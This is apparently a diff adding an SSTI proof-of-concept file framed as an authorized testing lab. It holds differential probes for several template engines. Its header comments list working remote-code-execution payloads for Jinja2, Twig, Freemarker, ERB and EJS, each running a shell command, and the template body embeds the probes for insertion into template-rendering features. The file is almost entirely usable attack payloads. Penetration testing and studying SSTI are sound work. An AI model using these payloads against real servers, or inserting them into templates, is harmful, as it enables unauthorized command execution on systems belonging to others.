@@ -1,0 +1,29 @@
+## Benign PoC lab - x8bitranjit style. Authorized security testing only.
+# Safe PoC -> x8bitranjit
+##
+## WHAT THIS DEMONSTRATES: SSTI (server-side template injection) probes.
+## A template file is inert by itself - it "fires" when a server-side engine
+## renders it (Jinja2/Twig/ERB/Freemarker...). This file is the per-engine
+## DIFFERENTIAL probe set to drop into any template-rendering feature
+## (invoice builders, email templates, theme editors, PDF generators).
+##
+## HOW TO READ RESULTS (the 7*7 differential - no false positives):
+##   Jinja2/Twig:            {{7*7}}   -> 49   AND   {{7*'7'}} -> 7777777
+##   Java EL / Freemarker:   ${7*7}    -> 49
+##   ERB / EJS:              <%= 7*7 %> -> 49
+##   Smarty (PHP):           {7*7}     -> 49
+##   Go text/template:       {{printf "%d" 49}} -> 49 (no arithmetic - disclosure only)
+##
+## RCE escalation per engine lives in the kits:
+##   Jinja2:  {{ cycler.__init__.__globals__.os.popen('id').read() }}
+##   Twig:    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+##   Freemarker: ${"freemarker.template.utility.Execute"?new()("id")}
+##   ERB:     <%= `id` %>
+##   EJS:     <%= global.process.mainModule.require('child_process').execSync('id') %>
+##
+## Benign rule: confirm with the arithmetic differential + ONE benign command
+## (id/whoami) - never exfiltrate in the PoC.
+
+[template body starts here]
+user_display_name: {{ user.name }}
+sanity_probe: {{7*7}} | {{7*'7'}} | ${7*7} | <%= 7*7 %> | {7*7}
